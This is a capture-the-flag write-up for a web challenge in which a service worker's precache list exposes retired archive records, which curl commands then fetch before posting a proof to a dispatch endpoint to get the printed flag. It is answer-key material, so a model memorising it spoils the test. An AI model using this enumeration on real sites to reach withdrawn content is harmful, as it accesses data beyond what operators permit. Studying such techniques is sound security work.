# Gate Zero — Web (399 pts)

> Afterlight Airways | Departures. A passenger was assigned to Terminal Zero, a place the live
> kiosk denies exists. Find what the kiosk remembers when the network disappears.
> `http://45.77.247.35:22006`

**Flag:** `CYBLTZ2026{0ffL1n3_b04rd_n3v3r_f0rg07}`

"What the kiosk remembers when the network disappears" is a **service-worker offline cache**.
The live board is empty, but the SW pre-cached records the server will no longer serve.

## The service worker

The departures page registers `/sw.js`. Fetch it directly:

```js
const CACHE = 'gate-zero-v5';
self.addEventListener('install', event => {
  event.waitUntil(caches.open(CACHE).then(cache => cache.addAll([
    '/archive/flight-prior.json',
    '/archive/flight.json',
    '/dispatch'
  ])));
});
```

Those three URLs are exactly what the offline kiosk "remembers."

## The remembered records

```bash
curl -s http://45.77.247.35:22006/archive/flight-prior.json
# {"flight":"AL2602","gate":"T0-08","status":"retired",
#  "superseded_by":"/archive/flight.json","proof":"offline-cache-remembers-T0-08"}

curl -s http://45.77.247.35:22006/archive/flight.json
# {"flight":"AL2602","gate":"T0-00","status":"last-synced","proof":"offline-cache-remembers-T0-00"}
```

`flight-prior.json` is where **Terminal Zero** (gate `T0-08`) lives — the retired record the
live board denies. `flight.json` is the last state the cache synced before the network dropped.

## Dispatch intake

`/dispatch` describes a recovery endpoint:

```
POST /dispatch   Content-Type: application/json   {"proof":"<archived proof>"}
Replace the placeholder with the exact proof stored in the offline archive.
```

The accepted proof is the **last-synced** one the cache holds (`T0-00`); the retired `T0-08`
proof is rejected as stale:

```bash
curl -s -X POST http://45.77.247.35:22006/dispatch \
  -H 'Content-Type: application/json' \
  --data '{"proof":"offline-cache-remembers-T0-00"}'
# -> {"flag": "CYBLTZ2026{0ffL1n3_b04rd_n3v3r_f0rg07}"}
```

(`offline-cache-remembers-T0-08` → `{"error":"dispatch proof rejected"}`.)

**Takeaway:** a PWA's `Cache` / service worker is attacker-readable client state. Anything added
to `cache.addAll([...])` is served offline regardless of whether the origin still exposes it —
treat the precache manifest as a public directory listing.
